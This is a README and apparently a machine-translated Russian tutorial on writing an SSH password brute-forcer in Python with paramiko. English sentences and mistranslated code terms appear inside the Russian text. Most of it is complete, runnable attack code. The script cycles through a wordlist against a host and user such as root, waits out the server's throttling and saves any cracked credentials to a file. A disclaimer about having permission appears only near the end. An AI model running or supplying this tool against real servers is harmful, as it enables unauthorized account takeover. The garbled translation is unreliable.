# [How to Brute-Force SSH Servers in Python](https://www.thepythoncode.com/article/brute-force-ssh-servers-using-paramiko-in-python)
To run this:
- `pip3 install -r requirements.txt`
- 
    ```
    python bruteforce_ssh.py --help
    ```
    **Outputs:**
    ```
    usage: bruteforce_ssh.py [-h] [-P PASSLIST] [-u USER] host

    SSH Bruteforce Python script.

    positional arguments:
    host                  Hostname or IP Address of SSH Server to bruteforce.

    optional arguments:
    -h, --help            show this help message and exit
    -P PASSLIST, --passlist PASSLIST
                            File that contain password list in each line.
    -u USER, --user USER  Host username.
    ```
- If you want to bruteforce against the server `192.168.1.101` for example, the user `root` and a password list of `wordlist.txt`:
    ```
    python bruteforce_ssh.py 192.168.1.101 -u root -P wordlist.txt
    ```
##
# [[] / []]()
Атака методом перебора — это действие, которое включает в себя повторяющиеся попытки многих комбинаций паролей взломать систему, требующую проверки подлинности. Существует множество инструментов с открытым исходным кодом для перебора SSH в Linux, таких как Hydra, Nmap и Metasploit. Тем не менее,в этом уроке вы узнаете, как вы можете сделать скрипт грубой силы SSH на языке программирования Python.

Читайте также: Как сделать сканер поддоменов в Python.

Мы будем использовать библиотеку paramiko, которая предоставляет нам простой клиентский интерфейс SSH. Давайте установим его:

$ pip3 install paramiko colorama
Мы используем colorama только для печати в цветах, ничего больше.

Откройте новый файл Python и импортируйте необходимые модули:

import paramiko
import socket
import time
from colorama import init, Fore
Определение некоторых цветов, которые мы собираемся использовать:

# initialize colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE
Теперь давайте создадим функцию, которая, учитывая имя хоста, имя пользователя и пароль, сообщает нам, является ли комбинация правильной:

def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
Получите: Создайте 24 этических хакерских скрипта и инструмента с помощью Python Book

Здесь можно рассказать о многом. Во-первых, мы инициализируем наш SSH-клиент с помощью paramiko. Класс SSHClient(), представляющий собой высокоуровневое представление сеанса с SSH-сервером.

Во-вторых, мы устанавливаем политику для использования при подключении к серверам без известного ключа хоста; мы использовали paramiko. AutoAddPolicy(), который является политикой для автоматического добавления имени хоста и нового ключа хоста к локальным ключам хоста и их сохранения.

Наконец, мы пытаемся подключиться к SSH-серверу и аутентифицироваться на нем с помощью метода client.connect() с 3 секундами тайм-аута, этот метод вызывает:

socket.timeout: когда хост недоступен в течение 3 секунд.
парамико. AuthenticationException: если комбинация имени пользователя и пароля неверна.
парамико. SSHException: когда за короткий промежуток времени было выполнено много попыток логирования, другими словами, сервер обнаруживает, что это какая-то грубая сила, мы будем это знать и будем спать минуту и рекурсивно вызывать функцию снова с теми же параметрами.
Если ни одно из вышеперечисленных исключений не было вызвано, то соединение успешно установлено, а учетные данные верны; в этом случае мы возвращаем значение True.

Поскольку это сценарий командной строки, мы будем анализировать аргументы, переданные в командной строке:

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
We basically parsed arguments to retrieve the hostname, username, and password list file and then iterate over all the passwords in the wordlist, I ran this on my local SSH server. Here is a screenshot:

Результат для SSH-сервера с перебором с помощью скрипта Pythonwordlist.txt — это файл списка паролей Nmap, содержащий более 5000 паролей. По сути, я взял его из ОС Kali Linux по пути "/usr/share/wordlists/nmap.lst". Однако, если вы хотите создать свой собственный пользовательский список слов, я рекомендую вам использовать инструмент Crunch.

ОТКАЗ от ответственности: Протестируйте это на сервере или компьютере, на котором у вас есть разрешение на тестирование. В противном случае это не наша ответственность.

Хорошо, мы в основном закончили с этим учебником. Узнайте, как можно расширить этот сценарий для использования многопоточности для быстрого перебора.

Если вы хотите вместо этого перебор FTP-серверов, ознакомьтесь с этим руководством.

Наконец, у нас есть электронная книга Ethical Hacking with Python, где мы создаем 24 хакерских инструмента и скрипта с Python с нуля! Обязательно проверьте это, если вы заинтересованы.

СВЯЗАННЫЕ С: Как сделать сканер портов в Python с помощью библиотеки сокетов.